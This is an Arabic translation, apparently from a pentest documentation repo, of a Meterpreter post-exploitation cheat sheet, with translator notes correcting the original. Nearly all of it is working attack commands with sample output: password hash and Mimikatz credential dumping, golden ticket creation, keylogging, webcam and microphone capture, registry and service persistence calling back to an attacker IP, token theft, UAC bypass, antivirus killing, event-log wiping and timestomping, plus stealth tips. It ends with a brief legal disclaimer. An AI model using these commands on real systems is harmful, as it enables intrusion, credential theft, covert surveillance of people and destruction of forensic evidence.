<a id="-meterpreter---complete-cheatsheet"></a>
# 🎭 Meterpreter — دليل مرجعي شامل

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![ما بعد الاستغلال](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **أداة متكاملة لما بعد الاستغلال** - مجموعة أدواتك بعد الحصول على الوصول

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [ما هو Meterpreter؟](#-what-is-meterpreter)
- [الأوامر الأساسية](#-core-commands)
- [معلومات النظام](#-system-information)
- [أوامر نظام الملفات](#-file-system-commands)
- [أوامر الشبكة](#-network-commands)
- [أوامر العمليات](#-process-commands)
- [أوامر المستخدم والصلاحيات](#-user--privilege-commands)
- [جمع كلمات المرور](#-password-harvesting)
- [تسجيل ضغطات المفاتيح (Keylogging)](#-keylogging)
- [لقطات الشاشة وكاميرا الويب](#-screenshot--webcam)
- [ترسيخ الوصول (Persistence)](#-persistence)
- [العبور الشبكي وإعادة توجيه المنافذ](#-pivoting--port-forwarding)
- [مقاومة التحليل الجنائي الرقمي (Anti-Forensics)](#-anti-forensics)
- [السكربتات والأتمتة](#-scripting--automation)
- [جدول مرجعي سريع](#-quick-reference-table)
- [نصائح وحيل](#-tips--tricks)

---

<a id="-what-is-meterpreter"></a>
## 🎯 ما هو Meterpreter؟

> **توضيح النقل:** وصف DLL وTLS في الأصل ليس عاماً لكل المنصات والحمولات. توضح [وثائق Metasploit الرسمية](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html) وجود نواقل TCP وHTTP(S) مختلفة. كما أن التنفيذ في الذاكرة لا يعني انعدام الآثار أو غياب إمكانية الرصد.


**Meterpreter**، اختصار Meta-Interpreter، حمولة متقدمة قابلة للتوسعة ديناميكياً. يصف الأصل عملها بحقن DLL في الذاكرة والاتصال عبر مقبس مرحلة التحميل الأولية (Stager)؛ تختلف التفاصيل حسب المنصة ونوع الحمولة، كما يوضح التنبيه أدناه.

<a id="key-features"></a>
### الميزات الأساسية

| الميزة | الوصف |
|---------|-------------|
| **التنفيذ في الذاكرة** | يعمل بالكامل في RAM مع آثار محدودة وفق وصف الأصل |
| **اتصالات مشفّرة** | قناة مشفّرة بـ TLS إلى خادم القيادة والتحكم C2 وفق وصف الأصل |
| **قابل للتوسعة** | تحميل الإضافات أثناء التشغيل |
| **متعدد المنصات** | Windows, Linux, macOS, Android, PHP, Java |
| **يدعم العبور الشبكي (Pivoting)** | توجيه حركة المرور عبر الأجهزة المخترقة |

<a id="meterpreter-types"></a>
### أنواع Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-core-commands"></a>
## ⌨️ الأوامر الأساسية

<a id="help--navigation"></a>
### المساعدة والتنقل

```bash
# عرض جميع الأوامر
meterpreter > help

# الحصول على مساعدة لأمر محدد
meterpreter > help upload

# عرض معلومات القنوات
meterpreter > channel -l
```

<a id="session-management"></a>
### إدارة الجلسات

> **تصحيح:** الأمر `exit` ينهي جلسة Meterpreter، ولا يكتفي بإعادتها إلى الخلفية كما قد يوحي تعليق الأصل. استخدم المعنى المناسب لـ `background` عند قراءة المثال؛ راجع [إدارة الجلسات الرسمية](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/).


```bash
# عرض معلومات الجلسة
meterpreter > info

# وضع الجلسة الحالية في الخلفية
meterpreter > background
meterpreter > bg

# العودة إلى msfconsole وفق تعليق الأصل
meterpreter > exit

# إنهاء الجلسة بالكامل
meterpreter > quit

# إعادة الاتصال عند انقطاعه
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

<a id="channel-operations"></a>
### عمليات قنوات الاتصال

```bash
# عرض القنوات النشطة
meterpreter > channel -l

# التفاعل مع قناة
meterpreter > channel -i <id>

# القراءة من قناة
meterpreter > channel -r <id>

# الكتابة إلى قناة
meterpreter > channel -w <id>

# إغلاق قناة
meterpreter > channel -c <id>
```

---

<a id="-system-information"></a>
## 💻 معلومات النظام

<a id="basic-system-info"></a>
### معلومات النظام الأساسية

```bash
# الحصول على معلومات النظام
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# عرض المستخدم الحالي
meterpreter > getuid
Server username: WIN-PC\Administrator

# عرض معرّف العملية الحالية
meterpreter > getpid
Current pid: 1234

# عرض اسم العملية
meterpreter > getpname

# التحقق من التشغيل داخل آلة افتراضية
meterpreter > run post/windows/gather/checkvm
```

<a id="environment--registry"></a>
### البيئة وسجل Windows

```bash
# عرض متغيرات البيئة
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# ضبط متغير بيئة
meterpreter > setenv VAR value

# عمليات سجل Windows
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

<a id="installed-software--patches"></a>
### البرمجيات المثبتة والتصحيحات

```bash
# عرض التطبيقات المثبتة
meterpreter > run post/windows/gather/enum_applications

# عرض التصحيحات والإصلاحات العاجلة المثبتة
meterpreter > run post/windows/gather/enum_patches

# البحث عن مسارات خدمات غير محاطة بعلامات اقتباس
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

<a id="-file-system-commands"></a>
## 📁 أوامر نظام الملفات

<a id="navigation"></a>
### التنقل

```bash
# عرض مجلد العمل
meterpreter > pwd
C:\Users\Administrator\Desktop

# عرض محتويات المجلد
meterpreter > ls
meterpreter > ls -la

# تغيير المجلد
meterpreter > cd C:\\Users
meterpreter > cd ..

# عرض المجلد المحلي الحالي
meterpreter > lpwd

# تغيير المجلد المحلي
meterpreter > lcd /tmp

# عرض محتويات المجلد المحلي
meterpreter > lls
```

<a id="file-operations"></a>
### عمليات الملفات

```bash
# قراءة محتويات ملف
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# تحرير ملف
meterpreter > edit C:\\file.txt

# حذف ملف
meterpreter > rm C:\\temp\\malware.exe

# إنشاء مجلد
meterpreter > mkdir C:\\temp\\hidden

# إزالة مجلد
meterpreter > rmdir C:\\temp\\hidden

# نسخ ملف
meterpreter > cp source.txt destination.txt

# نقل ملف أو إعادة تسميته
meterpreter > mv oldname.txt newname.txt
```

<a id="file-transfer"></a>
### نقل الملفات

```bash
# تنزيل ملف من الهدف
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# تنزيل المجلدات ومحتوياتها تكرارياً
meterpreter > download -r C:\\Users\\Administrator\\Documents

# رفع ملف إلى الهدف
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# عرض تقدم التنزيل أو الرفع
meterpreter > download -p C:\\large_file.zip
```

<a id="file-search"></a>
### البحث عن الملفات

```bash
# البحث عن الملفات
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# البحث بامتداد محدد في جميع الأقراص
meterpreter > search -f *.kdbx

# البحث عن أنماط محددة لأسماء الملفات
meterpreter > search -f *password* -r
```

<a id="file-hashing--timestamps"></a>
### بصمات الملفات والطوابع الزمنية

```bash
# حساب بصمة الملف
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# تعديل الطوابع الزمنية باستخدام timestomp
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

<a id="-network-commands"></a>
## 🌐 أوامر الشبكة

<a id="network-information"></a>
### معلومات الشبكة

```bash
# عرض واجهات الشبكة
meterpreter > ipconfig
meterpreter > ifconfig

# عرض جدول التوجيه
meterpreter > route

# عرض ذاكرة ARP المؤقتة
meterpreter > arp

# عرض اتصالات الشبكة النشطة
meterpreter > netstat
```

<a id="port-forwarding"></a>
### إعادة توجيه المنافذ

```bash
# إعادة توجيه منفذ محلي إلى هدف بعيد
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# عرض عمليات إعادة توجيه المنافذ
meterpreter > portfwd list

# حذف إعادة توجيه منفذ
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# حذف جميع عمليات إعادة توجيه المنافذ
meterpreter > portfwd flush

# مثال: إعادة توجيه RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# اتصل الآن باستخدام: rdesktop 127.0.0.1:3389
```

<a id="dns--network-utilities"></a>
### أدوات DNS والشبكة

```bash
# حل اسم المضيف
meterpreter > resolve google.com

# عرض إعدادات الوكيل
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-process-commands"></a>
## ⚙️ أوامر العمليات

<a id="process-listing"></a>
### عرض العمليات

```bash
# عرض جميع العمليات
meterpreter > ps

# تصفية العمليات
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# عرض معلومات العملية الحالية
meterpreter > getpid
```

<a id="process-manipulation"></a>
### التحكم في العمليات

```bash
# الانتقال إلى عملية أخرى
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# إنهاء عملية
meterpreter > kill <PID>

# تنفيذ أمر والحصول على مخرجاته
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# التنفيذ في الخلفية
meterpreter > execute -f notepad.exe -H

# التنفيذ بإدخال وإخراج عبر قناة
meterpreter > execute -f cmd.exe -c -i
```

<a id="process-migration-tips"></a>
### نصائح الانتقال بين العمليات

> **ملاحظة:** وصف عمليات مثل `lsass.exe` بأنها «آمنة» أو مطلوبة دائماً لـ `hashdump` تعميم في الأصل. يتوقف الانتقال على المعمارية والصلاحيات والحماية وحالة العملية؛ لا تفترض سلامته أو ضرورة الانتقال إلى LSASS لكل استخراج بصمات.


```bash
# أهداف انتقال آمنة في Windows وفق وصف الأصل
# - explorer.exe (سياق المستخدم، مستقر)
# - svchost.exe (SYSTEM، مثيلات متعددة)
# - lsass.exe (SYSTEM، مطلوب لـ hashdump وفق الأصل)

# العثور على explorer.exe والانتقال إليه
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# الانتقال آلياً إلى عملية مستقرة
meterpreter > run post/windows/manage/migrate
```

---

<a id="-user--privilege-commands"></a>
## 👤 أوامر المستخدم والصلاحيات

<a id="current-user-info"></a>
### معلومات المستخدم الحالي

> **تصحيح:** الأمر `getsystem` يحاول تصعيد الصلاحيات، وليس مجرد فحص سلبي لكونها مرتفعة. توضح [وثائق Rapid7](https://docs.rapid7.com/metasploit/meterpreter-getsystem/) أنه يحاول الانتقال من مسؤول محلي إلى SYSTEM؛ لا يضمن نجاحه.


```bash
# عرض المستخدم الحالي
meterpreter > getuid
Server username: WIN-PC\Administrator

# عرض الصلاحيات الحالية
meterpreter > getprivs

# فحص الصلاحيات المرتفعة في Windows وفق تعليق الأصل
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

<a id="privilege-escalation"></a>
### تصعيد الصلاحيات

```bash
# محاولة الحصول على صلاحيات SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # انتحال قناة مسماة (في الذاكرة/مسؤول)
meterpreter > getsystem -t 2  # انتحال قناة مسماة (Dropper/مسؤول)
meterpreter > getsystem -t 3  # نسخ رمز الوصول (في الذاكرة/مسؤول)

# تجاوز UAC من msfconsole
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# اقتراح استغلالات محلية
meterpreter > run post/multi/recon/local_exploit_suggester

# سرقة رمز وصول من عملية أخرى
meterpreter > steal_token <PID>

# التخلي عن رمز الوصول المسروق
meterpreter > drop_token

# انتحال مستخدم
meterpreter > impersonate_token "DOMAIN\\Administrator"

# عرض رموز الوصول المتاحة
meterpreter > use incognito
meterpreter > list_tokens -u
```

<a id="user-enumeration"></a>
### حصر المستخدمين

```bash
# عرض المستخدمين المحليين
meterpreter > run post/windows/gather/enum_logged_on_users

# عرض مستخدمي المجال إذا كان الجهاز منضماً إليه
meterpreter > run post/windows/gather/enum_domain_users

# عرض المجموعات المحلية
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

<a id="-password-harvesting"></a>
## 🔐 جمع كلمات المرور

<a id="hash-dumping"></a>
### استخراج بصمات كلمات المرور

```bash
# استخراج بصمات كلمات المرور (يتطلب SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# إذا فشل hashdump فجرّب
meterpreter > run post/windows/gather/smart_hashdump
```

<a id="mimikatz--kiwi-extension"></a>
### إضافة Mimikatz / Kiwi

```bash
# تحميل Kiwi (Mimikatz)
meterpreter > load kiwi

# استخراج جميع بيانات الاعتماد
meterpreter > creds_all

# استخراج كلمة المرور من الذاكرة
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# استخراج تذاكر Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# عرض كلمات مرور WiFi
meterpreter > kiwi_cmd misc::wifi

# تفريغ LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# تذكرة ذهبية (Golden Ticket)
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

<a id="credential-collection"></a>
### جمع بيانات الاعتماد

```bash
# البحث عن بيانات اعتماد داخل الملفات
meterpreter > run post/multi/gather/credentials/generic

# بيانات اعتماد المتصفح
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# مفاتيح SSH
meterpreter > run post/multi/gather/ssh_creds

# مدير بيانات اعتماد Windows
meterpreter > run post/windows/gather/enum_cred_store

# بيانات اعتماد Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-keylogging"></a>
## ⌨️ تسجيل ضغطات المفاتيح (Keylogging)

<a id="startstop-keylogger"></a>
### بدء مسجل ضغطات المفاتيح وإيقافه

```bash
# بدء مسجل ضغطات المفاتيح
meterpreter > keyscan_start
Starting the keystroke sniffer...

# استخراج ضغطات المفاتيح الملتقطة
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# إيقاف مسجل ضغطات المفاتيح
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

<a id="advanced-keylogging"></a>
### تسجيل متقدم لضغطات المفاتيح

```bash
# تشغيل مسجل المفاتيح كعملية مستقلة
meterpreter > run post/windows/capture/keylog_recorder

# الانتقال إلى عملية تصل إلى لوحة المفاتيح (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

<a id="-screenshot--webcam"></a>
## 📸 لقطات الشاشة وكاميرا الويب

<a id="screenshots"></a>
### لقطات الشاشة

```bash
# التقاط لقطة شاشة واحدة
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# التقاط لقطة شاشة في مسار مخصص
meterpreter > screenshot -p /tmp/screen.jpg

# لقطات شاشة متتابعة
meterpreter > run post/multi/gather/screen_spy

# عرض سطح المكتب مباشرة
meterpreter > screenshare
```

<a id="webcam-operations"></a>
### عمليات كاميرا الويب

```bash
# عرض كاميرات الويب
meterpreter > webcam_list
1: Integrated Webcam

# التقاط صورة من كاميرا الويب
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# التقاط صورة مع خيارات
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# بث كاميرا الويب مباشرة
meterpreter > webcam_stream
```

<a id="audio-recording"></a>
### تسجيل الصوت

```bash
# تسجيل الميكروفون
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# التسجيل لمدة مخصصة
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

<a id="-persistence"></a>
## 🔄 ترسيخ الوصول (Persistence)

> **ملاحظة توافق:** أوامر مثل `run persistence` و`run metsvc` و`run scraper` أمثلة من أساليب وسكربتات قديمة في الأصل. يوضح [المصدر الرسمي](https://docs.metasploit.com/api/Msf/Sessions/Scriptable.html) أن سكربتات Meterpreter القديمة مهملة لصالح الوحدات. لا يُفترض توافرها في كل إصدار؛ تحقّق من مساعدة النسخة والوحدات المتاحة. أُبقيت الأوامر والخيارات دون تغيير.


<a id="windows-persistence"></a>
### ترسيخ الوصول في Windows

```bash
# ترسيخ الوصول عبر السجل
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# ترسيخ الوصول عبر مهمة مجدولة
meterpreter > run post/windows/manage/persistence_exe

# ترسيخ الوصول عبر خدمة
meterpreter > run metsvc

# ترسيخ الوصول باستخدام WMI
meterpreter > run post/windows/manage/wmi_persistence
```

<a id="persistence-options-explained"></a>
### شرح خيارات ترسيخ الوصول

```bash
# خيارات سكربت persistence
-A        # بدء معالج اتصالات مطابق آلياً
-L <path> # موقع كتابة الحمولة
-P <path> # الحمولة المستخدمة
-S        # التشغيل كخدمة بصلاحيات SYSTEM
-T        # قالب EXE بديل
-U        # التشغيل عند تسجيل دخول المستخدم
-X        # التشغيل عند إقلاع النظام
-i <sec>  # الفاصل بين محاولات الاتصال
-p <port> # المنفذ الذي تتصل به الحمولة
-r <ip>   # عنوان IP الذي تتصل به الحمولة
```

<a id="remove-persistence"></a>
### إزالة آليات ترسيخ الوصول

```bash
# عرض آليات ترسيخ الوصول
meterpreter > run post/windows/gather/enum_persistence

# إزالة ترسيخ الوصول يدوياً
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

<a id="-pivoting--port-forwarding"></a>
## 🔀 العبور الشبكي وإعادة توجيه المنافذ

<a id="route-management"></a>
### إدارة المسارات

```bash
# إضافة مسار عبر الجلسة
meterpreter > run autoroute -s 10.10.10.0/24

# عرض المسارات
meterpreter > run autoroute -p

# حذف مسار
meterpreter > run autoroute -d -s 10.10.10.0/24

# من msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

<a id="socks-proxy"></a>
### وكيل SOCKS

```bash
# بدء وكيل SOCKS من msfconsole
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# إعداد proxychains
# تحرير /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# الاستخدام مع proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

<a id="port-forwarding-examples"></a>
### أمثلة إعادة توجيه المنافذ

```bash
# إعادة توجيه منفذ محلي إلى جهاز داخلي
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# إعادة توجيه منفذ عكسي
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# سيناريوهات توضيحية:
# الوصول إلى خادم ويب داخلي
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# الوصول إلى RDP داخلي
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# الوصول إلى SMB داخلي
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

<a id="-anti-forensics"></a>
## 🧹 مقاومة التحليل الجنائي الرقمي (Anti-Forensics)

<a id="clear-evidence"></a>
### مسح الأدلة

```bash
# مسح سجلات أحداث Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# تعديل الطوابع الزمنية للملفات
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

<a id="evasion-techniques"></a>
### تقنيات تفادي الرصد

```bash
# الانتقال إلى عملية مشروعة
meterpreter > migrate -N svchost.exe

# فحص وجود أدوات مراقبة
meterpreter > run post/windows/gather/enum_av

# تعطيل مكافحة الفيروسات (محفوف بالمخاطر)
meterpreter > run post/windows/manage/killav

# إخفاء العملية
meterpreter > run post/windows/manage/inject_host
```

---

<a id="-scripting--automation"></a>
## 📜 السكربتات والأتمتة

<a id="resource-scripts"></a>
### سكربتات الموارد (Resource Scripts)

```bash
# إنشاء سكربت موارد
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# تشغيل سكربت موارد
meterpreter > resource post_exploit.rc
```

<a id="common-scripts"></a>
### سكربتات شائعة

```bash
# حصر معلومات النظام
meterpreter > run scraper

# جمع جميع المعلومات
meterpreter > run winenum

# فحص الآلات الافتراضية
meterpreter > run checkvm

# عرض الشبكات الفرعية المحلية للعبور الشبكي
meterpreter > run get_local_subnets

# استطلاع متعدد المنصات
meterpreter > run post/multi/recon/local_exploit_suggester
```

<a id="irb-shell-ruby"></a>
### صدفة IRB التفاعلية للغة Ruby

```bash
# الدخول إلى وضع IRB
meterpreter > irb

# مثال: عرض الملفات
>> client.fs.dir.entries("C:\\")

# مثال: قراءة ملف
>> client.fs.file.open("C:\\secret.txt").read

# الخروج من IRB
>> exit
```

---

<a id="-quick-reference-table"></a>
## 📊 جدول مرجعي سريع

<a id="essential-commands"></a>
### الأوامر الضرورية

| الأمر | الوصف |
|---------|-------------|
| `sysinfo` | معلومات النظام |
| `getuid` | المستخدم الحالي |
| `getpid` | معرّف العملية الحالية |
| `ps` | عرض العمليات |
| `migrate <PID>` | الانتقال إلى عملية أخرى |
| `getsystem` | تصعيد الصلاحيات إلى SYSTEM |
| `hashdump` | استخراج بصمات كلمات المرور |
| `shell` | الانتقال إلى صدفة أوامر النظام |
| `upload <src> <dst>` | رفع ملف |
| `download <src>` | تنزيل ملف |
| `screenshot` | التقاط الشاشة |
| `webcam_snap` | لقطة من كاميرا الويب |
| `keyscan_start` | بدء مسجل ضغطات المفاتيح |
| `keyscan_dump` | الحصول على ضغطات المفاتيح |

<a id="file-operations-1"></a>
### عمليات الملفات

| الأمر | الوصف |
|---------|-------------|
| `pwd` | عرض مجلد العمل |
| `cd <dir>` | تغيير المجلد |
| `ls` | عرض الملفات |
| `cat <file>` | قراءة ملف |
| `edit <file>` | تحرير ملف |
| `rm <file>` | حذف ملف |
| `mkdir <dir>` | إنشاء مجلد |
| `search -f <pattern>` | البحث عن الملفات |

<a id="network-operations"></a>
### عمليات الشبكة

| الأمر | الوصف |
|---------|-------------|
| `ipconfig` | واجهات الشبكة |
| `route` | جدول التوجيه |
| `netstat` | الاتصالات النشطة |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | إعادة توجيه منفذ |
| `run autoroute -s <subnet>` | إضافة مسار للعبور الشبكي |

<a id="privilege-escalation-1"></a>
### تصعيد الصلاحيات

| الأمر | الوصف |
|---------|-------------|
| `getsystem` | الحصول على صلاحيات SYSTEM |
| `getprivs` | عرض الصلاحيات الحالية |
| `steal_token <PID>` | سرقة رمز وصول من عملية |
| `load incognito` | تحميل إضافة incognito |
| `list_tokens -u` | عرض رموز الوصول المتاحة |
| `impersonate_token` | انتحال رمز وصول مستخدم |

<a id="credential-harvesting"></a>
### استخراج بيانات الاعتماد

| الأمر | الوصف |
|---------|-------------|
| `hashdump` | استخراج بصمات SAM |
| `load kiwi` | تحميل Mimikatz |
| `creds_all` | جميع بيانات الاعتماد |
| `lsa_dump_sam` | تفريغ SAM عبر LSA |
| `kiwi_cmd <cmd>` | تنفيذ أمر Mimikatz |

---

<a id="-tips--tricks"></a>
## 💡 نصائح وحيل

<a id="best-practices"></a>
### أفضل الممارسات

1. **انتقل دائماً إلى عملية أخرى أولاً وفق نصيحة الأصل**
   ```bash
   # الانتقال إلى عملية مستقرة قبل أي إجراء وفق نصيحة الأصل
   meterpreter > migrate -N explorer.exe
   ```

2. **وضع الجلسات في الخلفية**
   ```bash
   # ضع الجلسات في الخلفية بدلاً من إغلاقها
   meterpreter > background
   ```

3. **استخدام حمولات باتصالات مشفّرة**
   ```bash
   # تفضيل حمولات HTTPS
   windows/meterpreter/reverse_https
   ```

4. **التحقق قبل التنفيذ**
   ```bash
   # التحقق دائماً من الصلاحيات
   meterpreter > getuid
   meterpreter > getprivs
   ```

<a id="troubleshooting"></a>
### استكشاف المشكلات وحلها

| المشكلة | الحل |
|-------|----------|
| انقطاع الجلسة | الانتقال إلى عملية مستقرة |
| فشل hashdump | الحصول على SYSTEM أولاً باستخدام `getsystem` |
| فشل getsystem | تجربة تقنية مختلفة باستخدام `-t 1,2,3` |
| مسجل المفاتيح لا يجمع بيانات | الانتقال إلى explorer.exe |
| انتهاء مهلة الأوامر | فحص الاتصال بالشبكة |

<a id="stealth-tips"></a>
### نصائح تقليل الظهور

```bash
# 1. الانتقال بعيداً عن العملية الأولية
meterpreter > migrate -N svchost.exe

# 2. مسح الآثار
meterpreter > clearev

# 3. استخدام timestomp على الملفات المرفوعة
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. حذف الملفات المنشأة عند الانتهاء
meterpreter > rm C:\\temp\\payload.exe
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ تنبيه قانوني

> **تحذير:** هذا الدليل مخصص للتعلم واختبارات الاختراق المصرح بها فقط. الوصول غير المصرح به إلى أنظمة الحاسوب مخالف للقانون؛ احصل دائماً على التفويض المناسب قبل الاختبار.

---

<a id="-related-resources"></a>
## 📚 مراجع ذات صلة

- [دليل Metasploit Framework](./README.ar.md)
- [توثيق Offensive Security](https://www.offensive-security.com/)
- [توثيق Rapid7 لـ Metasploit](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 أتقن مرحلة ما بعد الاستغلال!</b><br>
  <i>مع Meterpreter تبدأ مرحلة الاستكشاف الفعلي بعد الوصول الأولي</i>
</p>
